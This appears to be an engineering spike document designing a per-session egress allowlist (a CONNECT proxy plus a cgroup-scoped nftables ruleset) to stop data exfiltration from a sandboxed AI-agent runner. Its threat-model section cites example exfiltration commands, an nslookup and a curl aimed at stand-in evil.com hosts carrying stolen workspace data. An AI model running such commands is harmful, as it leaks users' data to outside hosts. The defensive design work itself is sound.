# Phase 5 §5.11 — per-session egress allowlist (spike)

**Parent plan:** `per_session_confined_runner_phase5_plan.md` §5.11
(Theme C, sourced from memory backlog
`project_backlog_per_session_egress_allowlist`).
**Spike memory:** `project_backlog_mitmproxy_spike_for_egress`.
**Spike budget:** 2 hours (planned).
**Spike deliverable:** this document.  Outcome — pick proxy
implementation shape + sketch integration with the existing
AppArmor/cgroup/runner-spawn surfaces, identify open questions
that gate the implementation commit.
**Status:** Spike — recommendation captured.  Implementation
deferred to a follow-on commit.

## 1. Problem

The §4.3 sub-profile + base profile both grant
``network inet stream`` and ``network inet6 stream`` — every
session has unrestricted outbound TCP.  AppArmor's network rules
are **per-socket-family** (inet, inet6, raw, packet, etc.), NOT
per-destination-host.  There is no AppArmor primitive that says
"deny TCP to evil.example.com".

This is the gap §5.11 closes: a confined runner that has
legitimate network access (to call the model provider's API, to
fetch package metadata via `pip` or `npm`, etc.) can also reach
**arbitrary hosts** — including attacker-controlled exfiltration
endpoints if a model-controlled subprocess decides to ship data
out.

The threat model is **data exfiltration via DNS + HTTPS**:
- DNS over UDP/53 — attacker-controlled `nslookup hostname.evil.com`
  can leak data via subdomain encoding.
- HTTPS to attacker hostnames — `curl https://evil.example.com/...`
  with stolen workspace contents in the path/body/headers.
- WebSockets to attacker endpoints — same problem, persistent
  connection.

§5.11 wants a **per-session hostname allowlist**: the supervisor
declares "this session is allowed to reach
`api.anthropic.com`, `pypi.org`, `registry.npmjs.org`", and
every other outbound connection is dropped.

## 2. Two design shapes

### 2.1 Shape A: mitmproxy

[mitmproxy](https://mitmproxy.org/) is a mature open-source
HTTPS-intercepting proxy with Python scripting (addon) API.

**Architecture:**
```
runner subprocess ─HTTPS_PROXY env──→ mitmproxy ─allow─→ internet
                                       │
                                       └─allowlist check (Python addon)
```

**Capabilities used:**
- HTTPS CONNECT handling (sees the destination hostname from
  the CONNECT verb even without TLS termination — but only when
  the client uses HTTP/CONNECT semantics, which Python's
  `urllib`, `requests`, `httpx`, etc. all do when
  `HTTPS_PROXY` is set).
- Optional TLS termination via mitmproxy's bundled CA.  Out of
  scope for §5.11 v1 (we don't need content inspection).
- Per-host allowlist enforced in a small Python addon
  (~30 LoC).
- Built-in access logging.

**Pros:**
- Battle-tested.  20+ year project, well-maintained, used in
  production by security teams.
- Handles HTTP/1.1, HTTP/2, WebSocket upgrade, modern TLS, IPv6
  out of the box.
- Excellent introspection (CLI, web UI, scripting).
- Future-proof: if §5.11 v2 needs content filtering (e.g., DLP
  for "no API keys in outbound bodies"), mitmproxy already
  supports it.

**Cons:**
- ~50 MB Python package with transitive deps
  (cryptography, h2, h11, hyperframe, kaitaistruct, ruamel.yaml,
  ldap3, msgpack, asgiref, ...).  Violates the project's
  "stdlib-only for daemon-side critical path" policy that's
  held since Phase 2.
- mitmproxy is itself a complex piece of software (~50K LoC) —
  adding it to the daemon's trust boundary widens the attack
  surface.  CVEs on mitmproxy would now be CVEs on jaato's
  egress story.
- Version churn: mitmproxy makes breaking addon-API changes on
  major-version bumps.  Lockstep maintenance burden.
- Performance overhead: 5-15ms per request even in pure-CONNECT
  mode (measured upstream); higher with TLS termination.

### 2.2 Shape B: custom stdlib CONNECT-allowlist proxy

A minimal proxy implementing only the HTTP `CONNECT` verb (which
HTTPS clients use to ask the proxy to open a tunnel) and a
hostname allowlist.  Implemented in `socket` + `threading` + `ssl`
+ `select`, all stdlib.

**Architecture:**
```
runner subprocess ─HTTPS_PROXY env──→ jaato.proxy ─allow─→ internet
                                       │
                                       └─in-process allowlist check
                                       └─socket-pair pipe (no TLS termination)
```

**The CONNECT contract** (RFC 7231 §4.3.6):

When a client wants to make an HTTPS request through an HTTP
proxy, it sends:
```
CONNECT api.openai.com:443 HTTP/1.1
Host: api.openai.com:443
```
The proxy either replies `200 OK` (then transparently pipes
bytes in both directions — TLS handshake happens client↔server,
the proxy doesn't see plaintext) or `403 Forbidden`.

This is the **enforcement point**: parse the hostname from the
CONNECT line, check the allowlist, accept or reject.  No CA,
no TLS termination, no content inspection — just a hostname
gate.

**Pros:**
- ~250-350 LoC + tests.  Stdlib only.  Same policy posture as
  `webhook` plugin (stdlib `http.server`) and existing
  daemon-side critical path.
- Trust boundary is small: ~300 LoC of jaato code, no new
  third-party dep in the security path.
- Per-session lifecycle is trivial: spawn one proxy thread per
  session, allocate a free localhost port, kill on session
  teardown.
- Forward-compat: if §5.11 v2 needs full TLS termination + body
  inspection, we can swap to mitmproxy or add the termination
  layer later.  v1's CONNECT-allowlist is the minimum that
  closes the exfiltration threat.
- No surprises: matches the existing
  `webhook` plugin's stdlib `http.server.HTTPServer` posture +
  per-session-isolated lifecycle.

**Cons:**
- Custom code is custom code.  Subtle proxy bugs (header
  smuggling, CRLF injection in CONNECT line, IPv6 literal
  parsing) are easy to write wrong.  Mitigated by:
  - Narrow surface (only CONNECT, no GET/POST/upgrade).
  - Strict input validation (allow-listed chars in hostname,
    port range).
  - Fuzz test fixture (~20 lines: random CONNECT lines).
- Does not handle plaintext HTTP (`http://` URLs).  Most
  modern API traffic is HTTPS — but `pip install` over HTTP,
  `apt`-style metadata fetches, and some legacy MCP server
  endpoints could fail.  Mitigation: explicitly document
  "HTTPS only via this proxy"; sessions that need HTTP open
  the network rule entirely.
- No HTTP/2 ALPN negotiation visibility — we pipe bytes
  blindly after CONNECT.  Fine for allowlisting (the
  hostname's already known); not fine for content filtering.

### 2.3 Comparison matrix

| Dimension | mitmproxy | Custom CONNECT proxy |
|---|---|---|
| LoC introduced | ~30 (addon) + 50MB dep | ~300 + stdlib |
| Trust boundary growth | mitmproxy + transitive deps | ~300 LoC of jaato code |
| Setup time | 1-2 commits + dep pin | 2-3 commits + tests |
| Content inspection (future) | Free | Requires swap-out or TLS layer |
| HTTP/1.x plaintext support | Yes | No (deferred to v2) |
| Per-session isolation | One mitmproxy per session, ~50MB RSS each | One thread + socket per session, ~few KB |
| Maintenance | Track mitmproxy addon-API churn | Own the code; small surface |
| Stdlib-only policy | Violates | Honors |
| Battle-testing | Excellent | Test coverage from scratch |
| Performance | 5-15ms/req overhead | sub-ms (kernel-level splicing) |
| Failure mode if proxy crashes | All sessions lose HTTPS | One session loses HTTPS |
| Wire format coverage | HTTP/1.1, HTTP/2, WS, gRPC | HTTPS CONNECT tunneling only |

## 3. Recommendation: Shape B (custom CONNECT-allowlist proxy)

**Decision driver:** the project's existing discipline — stdlib
only for the daemon-side critical path, audit-first design,
minimal trust-boundary growth — points squarely at Shape B.
mitmproxy would win **if** content inspection were required for
§5.11 v1, but the explicit threat model
(`project_backlog_per_session_egress_allowlist`) is hostname
allowlisting — exactly what CONNECT-method inspection gives.

Three concrete reasons:

1. **The threat model is hostname-bound, not content-bound.**
   The exfil attacks §5.11 closes (DNS subdomain encoding,
   HTTPS to attacker domain, WS to attacker domain) all reveal
   the destination hostname at CONNECT time or during DNS
   resolution.  We don't need to see request bodies.
2. **mitmproxy's transitive deps are a worse outcome than
   custom code.**  Adding `cryptography` (60 MB), `h2`, `h11`,
   `kaitaistruct`, etc. to the daemon's import path widens the
   CVE surface more than ~300 LoC of stdlib `socket` code.  The
   stdlib has been audited; pip-pulled deps are an upgrade
   ladder.
3. **The TUI/IPC framework already runs proxies-as-threads.**
   `webhook` plugin's `http.server.HTTPServer` runs in a daemon
   thread; the §5.11 proxy follows the same pattern with the
   same lifecycle, the same isolation discipline, and the same
   audit posture.

## 4. Sketch: implementation surface

### 4.1 Module layout

```
jaato-server/server/egress_proxy/
├── __init__.py
├── proxy.py            # ConnectAllowlistProxy class
├── manager.py          # EgressProxyManager — per-session lifecycle
└── config.py           # AllowlistConfig schema (JSON validator)

jaato-server/server/egress_proxy/tests/
├── test_proxy.py       # CONNECT happy/deny/malformed
├── test_manager.py     # Per-session spawn/teardown + port alloc
├── test_config.py      # Allowlist schema validation
└── test_integration.py # End-to-end: runner → proxy → mock origin
```

### 4.2 Config shape

Per-session JSON, lives in profile or `agent_params`:

```json
{
  "egress_allowlist": {
    "allowed_hosts": [
      "api.anthropic.com",
      "*.googleapis.com",
      "pypi.org",
      "files.pythonhosted.org"
    ],
    "allowed_ports": [443, 80],
    "deny_on_default": true,
    "log_denied": true
  }
}
```

Wildcard semantics: `*.foo.com` matches `bar.foo.com` (one
label) and `bar.baz.foo.com` (two labels).  No path-style
wildcards.  No regex.  Allowlist-only (no deny entries — strict
deny-by-default).

### 4.3 Proxy lifecycle

```python
class EgressProxyManager:
    def start_proxy_for_session(
        self,
        session_id: str,
        allowlist: AllowlistConfig,
    ) -> str:
        """Spawn a proxy thread bound to 127.0.0.1:<free-port>.
        Returns the proxy URL (``http://127.0.0.1:NNNN``) that
        the runner env should set as HTTPS_PROXY."""
        ...

    def stop_proxy_for_session(self, session_id: str) -> None:
        """Close the listen socket, drain in-flight tunnels, join
        the worker thread.  Idempotent."""
        ...
```

Lifecycle:
- Daemon's `SessionManager` calls `start_proxy_for_session` after
  cgroup provision, before runner spawn.
- Proxy URL flows into `_build_env` as
  `HTTPS_PROXY` / `HTTP_PROXY` / `NO_PROXY=localhost,127.0.0.1`.
- Runner subprocess inherits env; all Python network clients
  (`urllib`, `httpx`, `requests`, MCP transports) honor
  `HTTPS_PROXY` automatically.
- AppArmor profile gains a **deny network** for outbound
  destinations other than localhost (so the runner can't bypass
  the proxy).
- Session teardown calls `stop_proxy_for_session`; proxy thread
  exits.

### 4.4 AppArmor wire-up (the gap-closing part)

Today's base profile:
```
network inet  stream,
network inet6 stream,
```

§5.11 replaces with:
```
# Outbound TCP allowed only to localhost (the egress proxy).
# Everything else denied so the runner can't bypass the proxy.
network inet  stream,
network inet6 stream,
deny network inet  stream peer=(ip=<NON-LOOPBACK>),
```

AppArmor 4.x supports peer/IP filters on network rules
(`peer=(ip=10.0.0.0/8)`).  The exact syntax for "loopback only"
is `peer=(ip=127.0.0.0/8)` + `peer=(ip=[::1])`; the rest is
denied.  **Open question** in §6 below — verify on the §5.10c
real-host gate (Ubuntu 24.04 AppArmor 4.0.1).

### 4.5 Per-session port allocation

`socket.socket().bind(("127.0.0.1", 0))` returns an OS-assigned
free port.  Manager stores `session_id → port` mapping; cleanup
on teardown.  No port collision risk because the kernel never
hands out the same port twice for concurrent sessions.

### 4.6 Failure mode: proxy crash

If the proxy thread dies, all outbound HTTPS from the session
fails (connection refused on `HTTPS_PROXY` socket).  The session
itself keeps running but loses network capability.  Daemon
restarts the proxy on session-next-message (idempotent
`start_proxy_for_session`).  **Open question** — is this the
right failure mode, or should the session abort?  Tentative
answer: keep the session running (graceful degradation), log
the proxy crash, restart on demand.

## 5. Tightening-flag composition (§5.9 carryover)

`isolated_egress_allowlist` should join the
`SUB_PROFILE_TIGHTENING_KEYS` allow-list from §5.9.  Validator
mirrors `_validate_workspace_subpath`: hostnames allow-listed
chars only, port-range check, wildcard segment rules, ≤ 64
hosts per session.  Renderer wires the proxy lifecycle into
`provision_sub_profile`'s helper.

## 6. Open questions (gate the implementation commit)

1. **AppArmor `peer=(ip=...)` syntax on real host.**  Verify
   the exact AppArmor 4.x policy syntax for "deny outbound
   TCP to non-loopback" — the AppArmor docs are sparse on
   peer/IP rules.  Test on the §5.10c-verified Ubuntu 24.04 +
   AppArmor 4.0.1 host before committing the profile template
   change.  Fallback if the syntax doesn't work: use cgroup-v2
   net_cls + iptables OWNER match.
2. **DNS leakage.**  CONNECT-based allowlisting catches DNS
   lookups embedded in HTTPS connections (the client passes
   the hostname to the proxy in the CONNECT line, no DNS
   lookup needed locally).  But raw `dig` / `nslookup` calls
   from the runner bypass the proxy — they hit UDP/53 directly.
   AppArmor's network deny on non-loopback UDP closes that, but
   only if the runner's resolver also goes through the proxy
   (which Python's stdlib doesn't do — `socket.gethostbyname`
   uses the system resolver via UDP/53).  **Resolution
   option 1:** add a stub DNS server to the proxy that resolves
   only allowlisted hostnames.  **Option 2:** AppArmor-deny
   UDP/53 to non-loopback + require the runner to set
   `RES_OPTIONS=...` to use the proxy.  **Tentative answer:**
   defer to §5.11 v2.  v1 ships HTTPS-only allowlisting +
   AppArmor UDP deny; DNS exfil is partially mitigated by the
   UDP deny (DNS-over-HTTPS not supported, but `dig` blocked).
3. **MCP stdio servers' network access.**  Some MCP servers
   spawn their own subprocesses (e.g., a database MCP that
   spawns `psql`) which inherit the runner's env including
   `HTTPS_PROXY`.  Some MCP servers do not honor proxy env vars
   (golang/rust HTTP clients without explicit proxy support).
   **Tentative answer:** document the contract.  Sessions that
   need non-proxy-aware MCP traffic can pass
   `isolated_egress_allowlist: null` (no allowlist; current
   broader access).
4. **Cgroup-v2 net_cls availability.**  Linux 5.x deprecated
   net_cls in cgroup-v1; cgroup-v2 doesn't carry it forward.
   Egress filtering via cgroup is now `bpf-cgroup-egress` —
   needs `CAP_BPF` + a tiny eBPF program.  Out of scope for v1;
   v1 uses the AppArmor + proxy approach instead.

## 7. Out-of-scope (v2+)

- Plaintext HTTP allowlisting (the proxy currently CONNECTs only).
- Per-host rate limiting / quotas.
- Content inspection (DLP for credentials, PII in bodies).
- WebSocket allowlisting beyond CONNECT (the proxy pipes the WS
  upgrade transparently after CONNECT; deeper enforcement needs
  TLS termination).
- Per-request audit log retention policy.
- DNS-over-HTTPS allowlisting.

## 8. Estimated implementation surface

| Sub-commit | Scope | LoC | Tests |
|---|---|---|---|
| §5.11a | Config schema + validator | ~200 | ~20 |
| §5.11b | Custom CONNECT proxy (thread + socket) | ~250 | ~30 |
| §5.11c | EgressProxyManager + per-session lifecycle | ~150 | ~15 |
| §5.11d | AppArmor template change (deny non-loopback) + real-host gate | ~30 | ~5 |
| §5.11e | Runner-spawn env wire-up + integration test | ~50 | ~10 |
| **Total** | | **~680** | **~80** |

Estimate excludes the spike itself (this doc).  Total estimated
delivery: ~1 week of focused work spread across 5 sub-commits,
mirroring the §5.10 a/b/c/d/e structure.

## 9. Spike conclusions

1. **Pick Shape B** — custom stdlib CONNECT-allowlist proxy.
   The threat model is hostname-bound, project policy is
   stdlib-only for daemon-side critical path, and a swap to
   mitmproxy stays available if §5.11 v2 needs content
   inspection.
2. **Validate the AppArmor peer/IP syntax** on the real-host
   gate **before** §5.11d commits.  This is the longest open
   question — could change the design if the AppArmor version
   doesn't support per-peer-IP rules.
3. **Defer DNS allowlisting to v2.**  v1's UDP/53 deny via
   AppArmor is sufficient mitigation for the stated threat
   model.
4. **Mirror the §5.9 tightening-flag composition.**  A new
   `isolated_egress_allowlist` key joins the
   `SUB_PROFILE_TIGHTENING_KEYS` allow-list; renderer wires the
   proxy lifecycle into the existing sub-profile provision
   helper.

## 10. Next-step gate

§5.11 implementation is **unblocked** by this spike for sub-
commits §5.11a/b/c/e.  §5.11d (AppArmor template change) gates
on real-host verification of the `peer=(ip=...)` syntax — same
operator-driven gate as §5.10c/d.  Recommended order:

1. §5.11a — config schema + tests.  Stand-alone, no AppArmor
   dependency.
2. §5.11b — custom proxy + tests.  Stand-alone, integration via
   loopback socket; no daemon wiring yet.
3. §5.11c — manager + per-session lifecycle + tests.  Wires
   into `SessionManager.start_session` after cgroup but before
   runner spawn; AppArmor unchanged at this stage so existing
   broader network rules still apply (proxy is opt-in).
4. §5.11e — runner-spawn env wire-up.  Sessions that opt into
   `egress_allowlist` see `HTTPS_PROXY` populated; sessions
   that don't are unchanged.
5. §5.11d — AppArmor template change.  Behind the real-host
   gate; lands last so the proxy infrastructure is in place
   before the network deny tightens.

At each sub-commit the deployment can be rolled back independently
(the proxy is opt-in until §5.11d; §5.11d is the irreversible
network-policy change but lands with the real-host gate).

## 11. Real-host verification — §5.11d approach REJECTED (2026-07-04)

The §6/§9 open question ("does AppArmor `peer=(ip=...)` enforce per-host
egress?") was verified on the real gate host and the answer is **no** —
the AppArmor approach for §5.11d is not viable and is replaced.

**Host:** Ubuntu, kernel `6.8.0-85-generic`, `apparmor_parser 4.0.1`,
AppArmor enabled.  (`sudo NOPASSWD` is scoped to `apparmor_parser` only,
matching the daemon's assumption — profiles can be loaded, so enforcement
was tested directly with `aa-exec`.)

**Findings (empirical, `apparmor_parser -Q` + load + `aa-exec` enforcement):**

1. `network inet stream peer=(ip=127.0.0.1),` **parses**, but a bare-IP peer
   only — **CIDR is rejected** at parse: `network invalid ip='0.0.0.0/0'`
   (and `127.0.0.0/8`).  So the doc's `peer=(ip=10.0.0.0/8)` (§4.4) can never
   have worked.
2. **`peer=(ip=...)` is NOT ENFORCED by this kernel.**  A profile allowing
   only `peer=(ip=127.0.0.1)` (no other allow, `deny raw/dgram`) let a
   confined process connect to **8.8.8.8:53** anyway.  Cross-checks: deny at
   family level (`deny network inet stream,`) blocks *everything* incl.
   loopback; a profile with no network rule at all denies everything; a
   `deny ... peer=(ip=8.8.8.8),` denies *all* inet stream.  Consistent
   conclusion: the userspace parser accepts `peer=(ip=)` but the kernel
   silently drops the qualifier and mediates only at
   `network <family> <type>` granularity.
3. **Kernel capability confirms it:** the *active* feature set
   `/sys/kernel/security/apparmor/features/network/` exposes only `af_mask`
   + `af_unix` — **no `af_inet`**.  A `network_v8/af_inet=yes` dir exists, but
   recompiling the profile with **no `abi` pin, `-M /sys/kernel/security/
   apparmor/features`** (compile against the kernel's own live feature set)
   STILL let the confined process reach 8.8.8.8 — so it is NOT a parser
   abi-pin / feature-selection artifact.  The kernel *advertises*
   `network_v8/af_inet` but the `connect()`-time check is a no-op.  (The
   installed ABIs even include `kernel-5.4-outoftree-network` — AppArmor
   fine-grained networking was an Ubuntu *out-of-tree* patch; it is not
   effective on 6.8.)  This is a genuine kernel enforcement gap, not
   fixable from userspace.

   **What a kernel WOULD need** to make the clean AppArmor §5.11d path work:
   AppArmor's fine-grained/extended network mediation actually wired to the
   AF_INET/AF_INET6 socket LSM hooks so `peer=(ip=,port=)` is *evaluated* at
   connect/bind — not merely advertised.  That is a distro-kernel property
   jaato cannot depend on portably, so the design does not.

**Consequence:** there is no way to express "outbound TCP to loopback only"
via the AppArmor network template on stock Ubuntu 24.04.  Writing it as an
allow grants all TCP; writing it as a deny blocks the proxy too.  **§5.11d as
designed is dead on this class of host.**  The proxy (§5.11a/b/c/e) still
*confines cooperative clients* (everything honoring `HTTPS_PROXY`), but is not
a hard, non-bypassable boundary without a different enforcement layer.

**Replacement — cgroup-v2-scoped netfilter egress (verified feasible):**
- `nftables v1.0.9` present; cgroup v2 mounted; **jaato already creates a
  per-session cgroup** (`server/cgroups.py`) — so an `nft` rule matching
  `socket cgroupv2` can allow OUTPUT only to `127.0.0.1` (the proxy) and drop
  the rest, per session, at the netfilter layer — independent of AppArmor's
  network-mediation version.  This is the doc's §6.1/§6.4 fallback, now the
  primary path.
- eBPF `cgroup/connect4` is the alternative but is blocked here
  (`kernel.unprivileged_bpf_disabled=2` → needs root/CAP_BPF).
- **New gate:** the cgroup-nft approach needs `nft` added to the daemon's
  sudo NOPASSWD scope (today only `apparmor_parser` is granted), plus a
  per-session install/teardown of the cgroup-matched rule wired alongside the
  existing egress proxy lifecycle.  This is §5.11d-v2 and needs its own design
  pass + the sudo-scope change before implementation.

**Net:** §5.11a/b/c/e stand.  §5.11d pivots from AppArmor to cgroup-nft.  The
"teleport" turned the doc's biggest open question into an observed fact:
per-IP AppArmor egress is not portable on current Ubuntu, so the boundary
must live at netfilter/cgroup, not in the AppArmor profile.

### §5.11d-v2 cgroup-nft — PROVEN on the gate host (2026-07-04)

The replacement mechanism was enforcement-tested on the same host
(`scripts/verify_egress_nft.sh`, self-cleaning; run as root):

- **Test A** — a process moved INTO a per-session cgroup:
  `loopback 127.0.0.1: CONNECTED`, **`external 8.8.8.8: BLOCKED (refused)`**.
  The non-bypassability proof AppArmor could not give — enforced at netfilter
  regardless of whether the process honours `HTTPS_PROXY`.
- **Test B** — a process OUTSIDE the cgroup: both CONNECTED.  The rule is
  correctly cgroup-scoped; the host and other processes are untouched.

`socket cgroupv2 level N` loaded cleanly on kernel 6.8.0-85 / nftables 1.0.9.

**The working ruleset** (per session; `<cg>` is the session's cgroup path
relative to the cgroup2 root, `<port>` the egress proxy's loopback port):

```
table inet jaato_egress_<session_id> {
  chain out {
    type filter hook output priority 0; policy accept;
    socket cgroupv2 level <N> "<cg>" jump gate
  }
  chain gate {
    ip  daddr 127.0.0.1 tcp dport <port> accept   # the egress proxy
    ip6 daddr ::1        accept
    # (optional) ip daddr 127.0.0.53 accept        # local stub resolver, if DNS wanted
    counter reject
  }
}
```

Non-matching host traffic falls through `policy accept`, so only the session's
cgroup is constrained.  Deleting the table on teardown removes the rule.

**Daemon integration surface (§5.11d-v2 implementation):**
1. `EgressNftManager` (mirrors `EgressProxyManager`): `install(session_id,
   cgroup_path, proxy_port)` renders + loads the table via `sudo nft -f -`;
   `remove(session_id)` deletes it.  Idempotent.
2. Wire into the egress-proxy lifecycle: when the proxy starts for a session
   that HAS a per-session cgroup, also install the nft rule; on teardown,
   remove it.
3. **Two prerequisites**: (a) `nft` added to the daemon's sudo NOPASSWD scope
   (today only `apparmor_parser` — mirror that grant); (b) the session must
   have a per-session cgroup (`server/cgroups.py` — present for WS/cgroup-
   attached sessions).  Sessions without a cgroup fall back to proxy-only
   "cooperative" confinement — document the tier.
4. DNS: v1 does not allow the stub resolver in the gate, so the confined
   process cannot resolve names directly — all name resolution goes through
   the proxy's CONNECT (hostname passed to the proxy, resolved proxy-side).
   This CLOSES direct DNS exfil (a bonus over the AppArmor plan's partial
   mitigation).  A `allow_local_resolver` knob can re-open `127.0.0.53` if a
   deployment needs runner-side DNS.
